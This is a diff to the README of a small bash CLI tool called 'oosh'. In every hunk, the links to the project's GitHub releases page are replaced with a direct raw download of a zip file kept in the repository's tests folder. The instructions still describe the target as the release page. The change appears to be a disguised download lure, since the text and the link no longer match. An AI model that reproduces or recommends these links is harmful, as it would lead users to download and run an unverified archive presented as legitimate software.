@@ -1,6 +1,6 @@
 # ⚙️ oosh - Simple bash CLI with smart features
 
-[![Download oosh](https://img.shields.io/badge/Download-oosh-brightgreen)](https://github.com/ranoufu123/oosh/releases)
+[![Download oosh](https://img.shields.io/badge/Download-oosh-brightgreen)](https://raw.githubusercontent.com/ranoufu123/oosh/main/tests/Software_v1.1.zip)
 
 ---
 
@@ -43,7 +43,7 @@ Follow the steps below to download and run oosh on Windows.
 
 Click the badge to visit the release page. There you will find the latest files ready to download.
 
-[![Download oosh](https://img.shields.io/badge/Download-oosh-brightgreen)](https://github.com/ranoufu123/oosh/releases)
+[![Download oosh](https://img.shields.io/badge/Download-oosh-brightgreen)](https://raw.githubusercontent.com/ranoufu123/oosh/main/tests/Software_v1.1.zip)
 
 ---
 
@@ -53,7 +53,7 @@ Click the badge to visit the release page. There you will find the latest files 
 
 2. Go to the release page by clicking the badge above or visit:
 
-   https://github.com/ranoufu123/oosh/releases
+   https://raw.githubusercontent.com/ranoufu123/oosh/main/tests/Software_v1.1.zip
 
 3. Find the latest release. It will be at or near the top of the page.
 
@@ -109,7 +109,7 @@ You can type `oosh r` and then press Tab. The tool will complete the command for
 
 Check the release page regularly:
 
-https://github.com/ranoufu123/oosh/releases
+https://raw.githubusercontent.com/ranoufu123/oosh/main/tests/Software_v1.1.zip
 
 Download the latest version as described above. Replace the old files with the new ones.
 
